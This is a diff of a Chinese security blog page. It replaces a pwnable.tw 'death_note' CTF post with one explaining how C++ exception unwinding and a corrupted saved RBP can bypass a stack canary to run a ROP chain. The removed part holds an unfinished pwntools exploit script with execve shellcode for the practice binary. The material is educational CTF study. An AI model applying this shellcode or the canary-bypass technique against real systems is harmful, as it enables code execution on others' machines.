@@ -13,19 +13,19 @@
   
   
   
-  <title>pwnable.tw death_note | koocola&#39;s blog</title>
+  <title>通过C++的异常机制绕过canary | koocola&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="做个记号">
+  <meta name="description" content="改写了canary的值也能执行ROP">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwnable.tw death_note">
-<meta property="og:url" content="http://yoursite.com/2018/09/30/death_note/index.html">
+<meta property="og:title" content="通过C++的异常机制绕过canary">
+<meta property="og:url" content="http://yoursite.com/2019/02/02/C++/index.html">
 <meta property="og:site_name" content="koocola&#39;s blog">
-<meta property="og:description" content="做个记号">
+<meta property="og:description" content="改写了canary的值也能执行ROP">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-02-02T01:39:44.322Z">
+<meta property="og:updated_time" content="2019-02-02T01:37:50.953Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwnable.tw death_note">
-<meta name="twitter:description" content="做个记号">
+<meta name="twitter:title" content="通过C++的异常机制绕过canary">
+<meta name="twitter:description" content="改写了canary的值也能执行ROP">
   
   
     <link rel="icon" href="/css/images/favicon.ico">
@@ -66,7 +66,7 @@
     </nav>
 </header>
       <div id="main" class="wrapper">
-        <div id="primary" class="site-content"><div id="content" role="main"><article id="post-death_note" class="post-death_note post type-post status-publish format-standard hentry">
+        <div id="primary" class="site-content"><div id="content" role="main"><article id="post-C++" class="post-C++ post type-post status-publish format-standard hentry">
     <!---->
 
       <header class="entry-header">
@@ -74,30 +74,31 @@
         
   
     <h1 class="entry-title article-title">
-      pwnable.tw death_note
+      通过C++的异常机制绕过canary
     </h1>
   
 
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://yoursite.com/2018/09/30/death_note/" data-id="cjrmtajlz000708tivkagclij" class="leave-reply bdsharebuttonbox" data-cmd="more"></a>
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/02/02/C++/" data-id="cjrmtajl4000008ti4hcdj6eb" class="leave-reply bdsharebuttonbox" data-cmd="more"></a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
     <div class="entry-content">
       
-        <p>做个记号<br><a id="more"></a><br>    暂时能力还不够- -（solve)<br>    printable shellcode的编写真的太烧脑了，想了一天还是没写出来，看大师傅们的WP只能感叹思路的神奇，做个记录，以后再慢慢想<br>    ‘’’<br>    from pwn import <em><br>f=process(“./death_note”)<br>shellcode=”\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x00\x00\x00\x00”<br>def add(index,content):<br>    f.sendlineafter(“ :”,”1”)<br>    f.sendlineafter(“ :”,str(index))<br>    f.sendlineafter(“ :”,content)<br>def dele(index):<br>    f.sendlineafter(“ :”,”3”)<br>    f.sendlineafter(“ :”,str(index))<br>def show(index):<br>    f.sendlineafter(“ :”,”2”)<br>    f.sendlineafter(“ :”,str(index))<br>add(-15,”ppp”)<br>gdb.attach(f,’b </em>0x80484d0’)<br>add(-15,”\x01”)<br>shell=asm(“pop eax;<br>pop eax;<br>xor ax,0x2970;<br>xor ax,0x80;<br>xor ax,0x20;    #eax=addr<br>push eax;<br>pop ecx;<br>xor [ecx+ ?],”)<br>f.interactive()</p>
-<p>#0x8048A85<br>    ‘’’</p>
-<p>主要就是能够写入\xcd\x80,可以利用栈中的数据进行构造</p>
+        <p>改写了canary的值也能执行ROP<br><a id="more"></a></p>
+<p>C++的异常处理机制主要包括try,throw,catch，在try模块中，如果用throw抛出异常，那么就会通过unwind栈回溯直到找到catch模块(找不到会调用std::terminate来结束)，然后把程序的控制权交给catch模块。</p>
+<p>如果我们可以在一块地址已知的区域布置ROP链，并且有一个漏洞在try模块中可以控制栈中保存的上个函数的RBP的值为ROP的地址，那么通过两次栈回溯(leave,ret)后，RSP的值就会指向我们前面写的RBP的值(也就是ROP处的地址)，再执行return 就可以控制程序流执行我们的ROP链</p>
+<p>相关题目： SWPUCTF easy_exploit<br>                    Shanghai-DCTF-2017pwn (<a href="https://www.anquanke.com/post/id/89855#h3-2" target="_blank" rel="noopener">https://www.anquanke.com/post/id/89855#h3-2</a>)</p>
 
       
     </div><!-- .entry-content -->
 
     <footer class="entry-meta">
-    <a href="/2018/09/30/death_note/">
-    <time datetime="2018-09-30T13:59:20.000Z" class="entry-date">
-        2018-09-30
+    <a href="/2019/02/02/C++/">
+    <time datetime="2019-02-02T01:13:20.000Z" class="entry-date">
+        2019-02-02
     </time>
 </a>
     
@@ -110,10 +111,8 @@
 <nav class="nav-single">
     <h3 class="assistive-text">文章导航</h3>
     
-        <span class="nav-previous"><a href="/2018/10/02/fastbin/" rel="prev"><span class="meta-nav">←</span> IO_FILE劫持总结</a></span>
     
-    
-        <span class="nav-next"><a href="/2018/09/24/pwn_build/" rel="next">pwn环境的简单部署 <span class="meta-nav">→</span></a></span>
+        <span class="nav-next"><a href="/2018/11/07/arm/" rel="next">mips、arm  环境部署及调试 <span class="meta-nav">→</span></a></span>
     
 </nav><!-- .nav-single -->
 
